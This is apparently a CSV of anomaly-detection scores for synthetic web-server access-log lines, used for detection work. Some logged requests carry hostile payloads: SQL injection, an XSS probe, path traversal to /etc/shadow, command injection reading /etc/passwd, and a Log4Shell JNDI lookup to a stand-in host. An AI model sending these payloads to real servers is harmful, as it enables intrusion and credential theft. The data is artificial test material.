score_content,score_session,score_fused,score_fused_norm,line
2.1610116958618164,,2.1610116958618164,2.1610116958618164,126.135.210.153 - - [10/Jan/2025:12:00:24 +0000] "GET / HTTP/1.1" 200 9138 "https://www.google.com/" "dirb/2.22"
36.19337463378906,,36.19337463378906,36.19337463378906,30.171.63.78 - - [10/Jan/2025:12:00:24 +0000] "PUT /search?q=monitor HTTP/1.1" 200 14679 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
47.607421875,,47.607421875,47.607421875,175.220.173.244 - - [10/Jan/2025:12:00:25 +0000] "HEAD /dashboard HTTP/1.1" 200 3493 "https://twitter.com/" "curl/7.85.0"
70.43672180175781,,70.43672180175781,70.43672180175781,120.251.21.235 - - [10/Jan/2025:12:00:25 +0000] "HEAD /search?q=headphones HTTP/1.1" 200 4974 "https://news.ycombinator.com/" "nikto/2.5.0"
3.1508214473724365,,3.1508214473724365,3.1508214473724365,166.11.182.162 - - [10/Jan/2025:12:00:25 +0000] "POST /.git/config HTTP/1.1" 200 7421 "https://news.ycombinator.com/" "curl/7.85.0"
1.830509066581726,,1.830509066581726,1.830509066581726,203.162.27.201 - - [10/Jan/2025:12:00:28 +0000] "GET /dashboard HTTP/1.1" 204 11689 "-" "curl/7.85.0"
4.724198341369629,,4.724198341369629,4.724198341369629,21.41.141.165 - - [10/Jan/2025:12:00:28 +0000] "POST /api/products HTTP/1.1" 204 3611 "https://twitter.com/" "dirb/2.22"
0.3095262944698334,,0.3095262944698334,0.3095262944698334,85.218.142.119 - - [10/Jan/2025:12:00:29 +0000] "GET /index.html HTTP/1.1" 200 13741 "https://www.google.com/" "nikto/2.5.0"
96.53107452392578,,96.53107452392578,96.53107452392578,70.149.97.8 - - [10/Jan/2025:12:00:29 +0000] "OPTIONS /search?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E HTTP/1.1" 201 11946 "https://www.google.com/" "sqlmap/1.7.2#stable"
104.8529281616211,,104.8529281616211,104.8529281616211,246.72.134.144 - - [10/Jan/2025:12:00:29 +0000] "TRACE /contact HTTP/1.1" 201 13169 "https://www.google.com/" "python-requests/2.31.0"
70.5160903930664,,70.5160903930664,70.5160903930664,197.171.83.4 - - [10/Jan/2025:12:00:29 +0000] "HEAD /search?q=phone HTTP/1.1" 200 1387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
104.85702514648438,,104.85702514648438,104.85702514648438,102.122.45.4 - - [10/Jan/2025:12:00:29 +0000] "TRACE /profile HTTP/1.1" 200 13938 "https://www.google.com/" "nikto/2.5.0"
30122.1328125,,30122.1328125,30122.1328125,134.201.207.41 - - [10/Jan/2025:12:00:30 +0000] "GET /.git/config HTTP/1.1" 404 1310 "https://www.google.com/" "curl/7.85.0"
27.595170974731445,,27.595170974731445,27.595170974731445,246.244.134.140 - - [10/Jan/2025:12:00:30 +0000] "POST /search?q=monitor HTTP/1.1" 200 14050 "-" "python-requests/2.31.0"
73.30774688720703,,73.30774688720703,73.30774688720703,7.199.93.150 - - [10/Jan/2025:12:00:32 +0000] "HEAD /search?q=headphones HTTP/1.1" 304 10794 "https://www.google.com/" "sqlmap/1.7.2#stable"
2.133596658706665,,2.133596658706665,2.133596658706665,103.177.136.102 - - [10/Jan/2025:12:00:32 +0000] "GET / HTTP/1.1" 204 2148 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
0.30960214138031006,,0.30960214138031006,0.30960214138031006,185.117.22.254 - - [10/Jan/2025:12:00:32 +0000] "GET /index.html HTTP/1.1" 201 14342 "https://twitter.com/" "sqlmap/1.7.2#stable"
1.8903831243515015,,1.8903831243515015,1.8903831243515015,173.220.198.93 - - [10/Jan/2025:12:00:35 +0000] "GET /api/products HTTP/1.1" 200 19291 "-" "sqlmap/1.7.2#stable"
103.20895385742188,,103.20895385742188,103.20895385742188,35.52.170.211 - - [10/Jan/2025:12:00:36 +0000] "TRACE /.git/config HTTP/1.1" 200 5487 "https://news.ycombinator.com/" "nikto/2.5.0"
13.40694808959961,,13.40694808959961,13.40694808959961,225.121.69.206 - - [10/Jan/2025:12:00:39 +0000] "PUT /profile HTTP/1.1" 200 19783 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
104.82598114013672,,104.82598114013672,104.82598114013672,181.179.42.39 - - [10/Jan/2025:12:00:42 +0000] "TRACE /contact HTTP/1.1" 200 4877 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
1.8680195808410645,,1.8680195808410645,1.8680195808410645,188.132.109.160 - - [10/Jan/2025:12:00:42 +0000] "GET /profile HTTP/1.1" 200 2182 "https://news.ycombinator.com/" "dirb/2.22"
76.14653015136719,,76.14653015136719,76.14653015136719,242.180.136.170 - - [10/Jan/2025:12:00:42 +0000] "OPTIONS /phpmyadmin HTTP/1.1" 304 7216 "https://www.google.com/" "sqlmap/1.7.2#stable"
47.629215240478516,,47.629215240478516,47.629215240478516,235.12.66.108 - - [10/Jan/2025:12:00:42 +0000] "HEAD /dashboard HTTP/1.1" 200 9650 "https://example.com/" "sqlmap/1.7.2#stable"
127.76347351074219,,127.76347351074219,127.76347351074219,71.9.225.83 - - [10/Jan/2025:12:00:42 +0000] "TRACE /search?q=ssd HTTP/1.1" 200 17682 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
98.99223327636719,,98.99223327636719,98.99223327636719,44.154.97.250 - - [10/Jan/2025:12:00:45 +0000] "OPTIONS /search?q=headphones HTTP/1.1" 302 11379 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
53.342288970947266,,53.342288970947266,53.342288970947266,204.135.126.174 - - [10/Jan/2025:12:00:45 +0000] "DELETE /search?q=ssd HTTP/1.1" 301 6926 "https://twitter.com/" "dirb/2.22"
27.609922409057617,,27.609922409057617,27.609922409057617,46.20.67.85 - - [10/Jan/2025:12:00:48 +0000] "POST /search?q=router HTTP/1.1" 200 12838 "https://example.com/" "curl/7.85.0"
1.9483238458633423,,1.9483238458633423,1.9483238458633423,34.90.174.106 - - [10/Jan/2025:12:00:50 +0000] "GET /login HTTP/1.1" 200 6204 "https://twitter.com/" "curl/7.85.0"
50.483497619628906,,50.483497619628906,50.483497619628906,172.112.142.5 - - [10/Jan/2025:12:00:50 +0000] "DELETE /search?q=monitor HTTP/1.1" 204 11488 "-" "python-requests/2.31.0"
53.26669692993164,,53.26669692993164,53.26669692993164,16.240.147.61 - - [10/Jan/2025:12:00:53 +0000] "DELETE /search?q=monitor HTTP/1.1" 302 3473 "https://www.google.com/" "curl/7.85.0"
30122.16796875,,30122.16796875,30122.16796875,150.245.134.158 - - [10/Jan/2025:12:00:53 +0000] "GET /index.html HTTP/1.1" 401 93 "https://twitter.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
4.720010757446289,,4.720010757446289,4.720010757446289,241.88.235.79 - - [10/Jan/2025:12:00:55 +0000] "POST /dashboard HTTP/1.1" 200 10064 "https://example.com/" "dirb/2.22"
127.7690658569336,,127.7690658569336,127.7690658569336,112.109.103.59 - - [10/Jan/2025:12:00:56 +0000] "TRACE /api/backup?file=../../../../etc/shadow HTTP/1.1" 200 3403 "-" "curl/7.85.0"
36.25595474243164,,36.25595474243164,36.25595474243164,193.153.151.88 - - [10/Jan/2025:12:00:57 +0000] "PUT /api/user?id=1;DROP TABLE users HTTP/1.1" 200 8857 "https://news.ycombinator.com/" "nikto/2.5.0"
71.69902801513672,,71.69902801513672,71.69902801513672,8.164.74.146 - - [10/Jan/2025:12:00:58 +0000] "OPTIONS /cgi-bin/test.cgi HTTP/1.1" 200 14484 "https://twitter.com/" "dirb/2.22"
4.6759257316589355,,4.6759257316589355,4.6759257316589355,130.159.68.149 - - [10/Jan/2025:12:01:01 +0000] "GET /profile HTTP/1.1" 302 7735 "https://example.com/" "nikto/2.5.0"
30146.7734375,,30146.7734375,30146.7734375,81.173.119.104 - - [10/Jan/2025:12:01:04 +0000] "GET /api/run?cmd=cat+%2Fetc%2Fpasswd HTTP/1.1" 403 1493 "https://twitter.com/" "python-requests/2.31.0"
98.95398712158203,,98.95398712158203,98.95398712158203,123.219.188.244 - - [10/Jan/2025:12:01:04 +0000] "OPTIONS /search?q=headphones HTTP/1.1" 301 6256 "https://example.com/" "python-requests/2.31.0"
127.750244140625,,127.750244140625,127.750244140625,139.120.152.142 - - [10/Jan/2025:12:01:05 +0000] "TRACE /search?q=ssd HTTP/1.1" 200 13104 "https://news.ycombinator.com/" "dirb/2.22"
11045.83203125,,11045.83203125,11045.83203125,100.88.28.217 - - [10/Jan/2025:12:01:05 +0000] "GET /api/run?cmd=cat+%2Fetc%2Fpasswd HTTP/1.1" 502 1262 "https://www.google.com/" "python-requests/2.31.0"
0.21214380860328674,,0.21214380860328674,0.21214380860328674,217.85.28.128 - - [10/Jan/2025:12:01:06 +0000] "GET /assets/app.js HTTP/1.1" 200 7290 "-" "python-requests/2.31.0"
4.768304824829102,,4.768304824829102,4.768304824829102,50.130.202.112 - - [10/Jan/2025:12:01:06 +0000] "POST /contact HTTP/1.1" 204 7662 "-" "dirb/2.22"
0.2240353524684906,,0.2240353524684906,0.2240353524684906,187.3.92.144 - - [10/Jan/2025:12:01:06 +0000] "GET /assets/app.css HTTP/1.1" 201 18763 "https://twitter.com/" "nikto/2.5.0"
48.779666900634766,,48.779666900634766,48.779666900634766,87.138.138.244 - - [10/Jan/2025:12:01:06 +0000] "HEAD /cgi-bin/test.cgi HTTP/1.1" 304 4457 "https://example.com/" "nikto/2.5.0"
27.658933639526367,,27.658933639526367,27.658933639526367,9.243.52.194 - - [10/Jan/2025:12:01:09 +0000] "DELETE /contact HTTP/1.1" 200 1444 "https://example.com/" "python-requests/2.31.0"
0.18448728322982788,,0.18448728322982788,0.18448728322982788,25.136.36.93 - - [10/Jan/2025:12:01:09 +0000] "GET /assets/app.css HTTP/1.1" 200 5729 "-" "python-requests/2.31.0"
50.46906661987305,,50.46906661987305,50.46906661987305,111.178.229.50 - - [10/Jan/2025:12:01:10 +0000] "DELETE /search?q=monitor HTTP/1.1" 200 903 "https://news.ycombinator.com/" "python-requests/2.31.0"
73.50794219970703,,73.50794219970703,73.50794219970703,223.254.135.66 - - [10/Jan/2025:12:01:12 +0000] "OPTIONS /login HTTP/1.1" 200 18396 "https://example.com/" "curl/7.85.0"
130.43505859375,,130.43505859375,130.43505859375,34.111.191.72 - - [10/Jan/2025:12:01:14 +0000] "TRACE /search?q=headphones HTTP/1.1" 302 15098 "https://twitter.com/" "nikto/2.5.0"
104.87178039550781,,104.87178039550781,104.87178039550781,157.81.125.193 - - [10/Jan/2025:12:01:15 +0000] "TRACE /profile HTTP/1.1" 200 19274 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
30225.185546875,,30225.185546875,30225.185546875,220.205.69.97 - - [10/Jan/2025:12:01:16 +0000] "TRACE /logout HTTP/1.1" 403 346 "https://example.com/" "curl/7.85.0"
13.323501586914062,,13.323501586914062,13.323501586914062,116.224.60.221 - - [10/Jan/2025:12:01:17 +0000] "PUT /dashboard HTTP/1.1" 200 12291 "https://news.ycombinator.com/" "sqlmap/1.7.2#stable"
70.56963348388672,,70.56963348388672,70.56963348388672,37.174.77.174 - - [10/Jan/2025:12:01:20 +0000] "HEAD /api/product?id=123 HTTP/1.1" 200 6819 "https://news.ycombinator.com/" "nikto/2.5.0"
73.43231201171875,,73.43231201171875,73.43231201171875,133.82.198.31 - - [10/Jan/2025:12:01:20 +0000] "OPTIONS /logout HTTP/1.1" 200 5747 "-" "sqlmap/1.7.2#stable"
96.44503784179688,,96.44503784179688,96.44503784179688,49.184.236.219 - - [10/Jan/2025:12:01:21 +0000] "OPTIONS /?id=%24%7Bjndi%3Aldap%3A%2F%2Fevil.tld%2Fa%7D HTTP/1.1" 200 16491 "https://example.com/" "python-requests/2.31.0"
3.186408758163452,,3.186408758163452,3.186408758163452,137.90.253.223 - - [10/Jan/2025:12:01:24 +0000] "POST /.git/config HTTP/1.1" 200 18954 "https://twitter.com/" "dirb/2.22"
104.7827377319336,,104.7827377319336,104.7827377319336,29.225.147.74 - - [10/Jan/2025:12:01:27 +0000] "TRACE /dashboard HTTP/1.1" 200 10110 "-" "dirb/2.22"
73.33912658691406,,73.33912658691406,73.33912658691406,191.33.122.78 - - [10/Jan/2025:12:01:30 +0000] "HEAD /search?q=phone HTTP/1.1" 302 7368 "https://twitter.com/" "dirb/2.22"
30.420629501342773,,30.420629501342773,30.420629501342773,89.121.163.18 - - [10/Jan/2025:12:01:30 +0000] "DELETE /dashboard HTTP/1.1" 302 12656 "https://example.com/" "nikto/2.5.0"
70.5156478881836,,70.5156478881836,70.5156478881836,107.227.234.28 - - [10/Jan/2025:12:01:30 +0000] "HEAD /search?q=monitor HTTP/1.1" 200 14954 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
130.43450927734375,,130.43450927734375,130.43450927734375,221.84.63.83 - - [10/Jan/2025:12:01:30 +0000] "TRACE /search?q=headphones HTTP/1.1" 302 14920 "https://twitter.com/" "python-requests/2.31.0"
39.0399284362793,,39.0399284362793,39.0399284362793,1.34.25.91 - - [10/Jan/2025:12:01:30 +0000] "PUT /api/product?id=123 HTTP/1.1" 302 1142 "https://twitter.com/" "Wget/1.21.2 (linux-gnu)"
30135.205078125,,30135.205078125,30135.205078125,37.142.46.249 - - [10/Jan/2025:12:01:32 +0000] "PUT /login HTTP/1.1" 400 1115 "-" "python-requests/2.31.0"
70.55911254882812,,70.55911254882812,70.55911254882812,237.128.112.63 - - [10/Jan/2025:12:01:33 +0000] "HEAD /search?q=ssd HTTP/1.1" 200 2944 "https://twitter.com/" "sqlmap/1.7.2#stable"
36.235130310058594,,36.235130310058594,36.235130310058594,186.226.47.60 - - [10/Jan/2025:12:01:36 +0000] "PUT /api/product?id=123 HTTP/1.1" 200 2563 "https://twitter.com/" "sqlmap/1.7.2#stable"
30217.01953125,,30217.01953125,30217.01953125,254.41.82.225 - - [10/Jan/2025:12:01:36 +0000] "OPTIONS /search?q=phone HTTP/1.1" 403 267 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
30224.939453125,,30224.939453125,30224.939453125,173.99.29.63 - - [10/Jan/2025:12:01:37 +0000] "TRACE /api/products HTTP/1.1" 401 1388 "https://www.google.com/" "Wget/1.21.2 (linux-gnu)"
7.624007701873779,,7.624007701873779,7.624007701873779,84.208.23.221 - - [10/Jan/2025:12:01:39 +0000] "POST /logout HTTP/1.1" 302 15714 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
11094.859375,,11094.859375,11094.859375,131.197.29.254 - - [10/Jan/2025:12:01:42 +0000] "OPTIONS /about HTTP/1.1" 500 52 "https://www.google.com/" "sqlmap/1.7.2#stable"
96.30949401855469,,96.30949401855469,96.30949401855469,56.212.81.60 - - [10/Jan/2025:12:01:45 +0000] "OPTIONS /search?q=phone HTTP/1.1" 200 189 "https://twitter.com/" "sqlmap/1.7.2#stable"
127.71924591064453,,127.71924591064453,127.71924591064453,77.218.213.222 - - [10/Jan/2025:12:01:45 +0000] "TRACE /api/product?id=123 HTTP/1.1" 200 4976 "https://news.ycombinator.com/" "curl/7.85.0"
30123.623046875,,30123.623046875,30123.623046875,221.201.234.229 - - [10/Jan/2025:12:01:47 +0000] "GET /profile HTTP/1.1" 400 183 "https://www.google.com/" "curl/7.85.0"
0.28128111362457275,,0.28128111362457275,0.28128111362457275,182.67.210.141 - - [10/Jan/2025:12:01:47 +0000] "GET /index.html HTTP/1.1" 200 5461 "https://www.google.com/" "curl/7.85.0"
13.345281600952148,,13.345281600952148,13.345281600952148,81.124.182.242 - - [10/Jan/2025:12:01:49 +0000] "PUT /api/products HTTP/1.1" 200 8966 "-" "nikto/2.5.0"
73.350341796875,,73.350341796875,73.350341796875,168.20.19.73 - - [10/Jan/2025:12:01:52 +0000] "OPTIONS /dashboard HTTP/1.1" 200 9550 "https://example.com/" "nikto/2.5.0"
30.423486709594727,,30.423486709594727,30.423486709594727,52.171.215.10 - - [10/Jan/2025:12:01:54 +0000] "POST /search?q=laptop HTTP/1.1" 304 6329 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
47.74985122680664,,47.74985122680664,47.74985122680664,114.142.235.126 - - [10/Jan/2025:12:01:56 +0000] "HEAD /login HTTP/1.1" 200 6725 "-" "curl/7.85.0"
26.30603790283203,,26.30603790283203,26.30603790283203,104.19.206.95 - - [10/Jan/2025:12:01:57 +0000] "DELETE /.env HTTP/1.1" 200 17568 "-" "python-requests/2.31.0"
24.818727493286133,,24.818727493286133,24.818727493286133,168.110.83.167 - - [10/Jan/2025:12:02:00 +0000] "GET /api/backup?file=../../../../etc/shadow HTTP/1.1" 200 7518 "https://example.com/" "python-requests/2.31.0"
24.734630584716797,,24.734630584716797,24.734630584716797,194.152.37.83 - - [10/Jan/2025:12:02:02 +0000] "GET /search?q=camera HTTP/1.1" 200 16915 "https://twitter.com/" "nikto/2.5.0"
14.531986236572266,,14.531986236572266,14.531986236572266,9.45.189.230 - - [10/Jan/2025:12:02:03 +0000] "PUT /wp-login.php HTTP/1.1" 301 19361 "https://news.ycombinator.com/" "dirb/2.22"
24.71021270751953,,24.71021270751953,24.71021270751953,244.193.111.240 - - [10/Jan/2025:12:02:05 +0000] "GET /search?q=monitor HTTP/1.1" 200 14815 "https://twitter.com/" "dirb/2.22"
0.22599850594997406,,0.22599850594997406,0.22599850594997406,154.233.37.95 - - [10/Jan/2025:12:02:07 +0000] "GET /assets/app.js HTTP/1.1" 200 11289 "https://www.google.com/" "python-requests/2.31.0"
76.11984252929688,,76.11984252929688,76.11984252929688,240.118.111.197 - - [10/Jan/2025:12:02:09 +0000] "OPTIONS /phpmyadmin HTTP/1.1" 301 17902 "https://twitter.com/" "sqlmap/1.7.2#stable"
45.959651947021484,,45.959651947021484,45.959651947021484,55.201.221.93 - - [10/Jan/2025:12:02:10 +0000] "HEAD /cgi-bin/test.cgi HTTP/1.1" 200 9260 "https://www.google.com/" "dirb/2.22"
127.55956268310547,,127.55956268310547,127.55956268310547,182.212.114.163 - - [10/Jan/2025:12:02:13 +0000] "TRACE /search?q=%27+OR+1%3D1+-- HTTP/1.1" 200 6958 "https://news.ycombinator.com/" "dirb/2.22"
2.1780831813812256,,2.1780831813812256,2.1780831813812256,238.198.70.167 - - [10/Jan/2025:12:02:13 +0000] "GET / HTTP/1.1" 200 14459 "https://www.google.com/" "dirb/2.22"
70.54026794433594,,70.54026794433594,70.54026794433594,169.218.186.149 - - [10/Jan/2025:12:02:15 +0000] "HEAD /search?q=router HTTP/1.1" 200 17171 "https://example.com/" "sqlmap/1.7.2#stable"
11069.212890625,,11069.212890625,11069.212890625,153.167.69.247 - - [10/Jan/2025:12:02:17 +0000] "HEAD /profile HTTP/1.1" 503 53 "https://twitter.com/" "sqlmap/1.7.2#stable"
0.20901907980442047,,0.20901907980442047,0.20901907980442047,38.36.142.18 - - [10/Jan/2025:12:02:19 +0000] "GET /assets/app.css HTTP/1.1" 200 12845 "-" "Wget/1.21.2 (linux-gnu)"
70.5244140625,,70.5244140625,70.5244140625,251.44.246.154 - - [10/Jan/2025:12:02:20 +0000] "HEAD /search?q=router HTTP/1.1" 200 11820 "https://example.com/" "Wget/1.21.2 (linux-gnu)"
50.503257751464844,,50.503257751464844,50.503257751464844,91.246.58.18 - - [10/Jan/2025:12:02:20 +0000] "HEAD /profile HTTP/1.1" 304 1356 "https://example.com/" "curl/7.85.0"
70.5145492553711,,70.5145492553711,70.5145492553711,152.252.137.21 - - [10/Jan/2025:12:02:22 +0000] "HEAD /api/run?cmd=cat+%2Fetc%2Fpasswd HTTP/1.1" 200 3070 "-" "nikto/2.5.0"
11094.7666015625,,11094.7666015625,11094.7666015625,11.132.174.100 - - [10/Jan/2025:12:02:23 +0000] "OPTIONS /contact HTTP/1.1" 502 807 "https://news.ycombinator.com/" "curl/7.85.0"
0.193131685256958,,0.193131685256958,0.193131685256958,61.91.41.56 - - [10/Jan/2025:12:02:23 +0000] "GET /assets/app.js HTTP/1.1" 204 1559 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
39.20146179199219,,39.20146179199219,39.20146179199219,163.106.69.143 - - [10/Jan/2025:12:02:25 +0000] "PUT /?id=%24%7Bjndi%3Aldap%3A%2F%2Fevil.tld%2Fa%7D HTTP/1.1" 304 5364 "-" "nikto/2.5.0"
5.863131999969482,,5.863131999969482,5.863131999969482,150.89.83.93 - - [10/Jan/2025:12:02:28 +0000] "POST /cgi-bin/test.cgi HTTP/1.1" 304 4775 "https://example.com/" "sqlmap/1.7.2#stable"
27.703393936157227,,27.703393936157227,27.703393936157227,22.110.83.149 - - [10/Jan/2025:12:02:28 +0000] "DELETE /logout HTTP/1.1" 200 6717 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
27.684642791748047,,27.684642791748047,27.684642791748047,45.104.57.241 - - [10/Jan/2025:12:02:29 +0000] "DELETE /contact HTTP/1.1" 200 10948 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
1.7889213562011719,,1.7889213562011719,1.7889213562011719,195.12.2.254 - - [10/Jan/2025:12:02:32 +0000] "GET /phpmyadmin HTTP/1.1" 200 6372 "https://twitter.com/" "curl/7.85.0"
36.184505462646484,,36.184505462646484,36.184505462646484,38.48.36.5 - - [10/Jan/2025:12:02:34 +0000] "PUT /search?q=router HTTP/1.1" 200 6496 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
53.41335678100586,,53.41335678100586,53.41335678100586,232.63.41.108 - - [10/Jan/2025:12:02:35 +0000] "DELETE /api/backup?file=../../../../etc/shadow HTTP/1.1" 302 7613 "https://news.ycombinator.com/" "sqlmap/1.7.2#stable"
27.51563262939453,,27.51563262939453,27.51563262939453,148.197.254.196 - - [10/Jan/2025:12:02:38 +0000] "POST /search?q=%27+OR+1%3D1+-- HTTP/1.1" 200 316 "https://example.com/" "dirb/2.22"
30.4050235748291,,30.4050235748291,30.4050235748291,108.134.108.209 - - [10/Jan/2025:12:02:39 +0000] "POST /search?q=laptop HTTP/1.1" 301 19961 "-" "dirb/2.22"
13.385868072509766,,13.385868072509766,13.385868072509766,190.193.225.124 - - [10/Jan/2025:12:02:39 +0000] "PUT /logout HTTP/1.1" 204 4280 "https://example.com/" "dirb/2.22"
1.8813399076461792,,1.8813399076461792,1.8813399076461792,25.201.190.251 - - [10/Jan/2025:12:02:41 +0000] "GET /contact HTTP/1.1" 200 6766 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
50.30595779418945,,50.30595779418945,50.30595779418945,178.191.25.7 - - [10/Jan/2025:12:02:43 +0000] "HEAD /server-status HTTP/1.1" 302 6399 "https://www.google.com/" "dirb/2.22"
1.7288674116134644,,1.7288674116134644,1.7288674116134644,89.67.167.165 - - [10/Jan/2025:12:02:45 +0000] "GET /server-status HTTP/1.1" 200 493 "https://twitter.com/" "nikto/2.5.0"
0.20776677131652832,,0.20776677131652832,0.20776677131652832,11.19.113.41 - - [10/Jan/2025:12:02:47 +0000] "GET /assets/app.css HTTP/1.1" 200 12443 "https://example.com/" "python-requests/2.31.0"
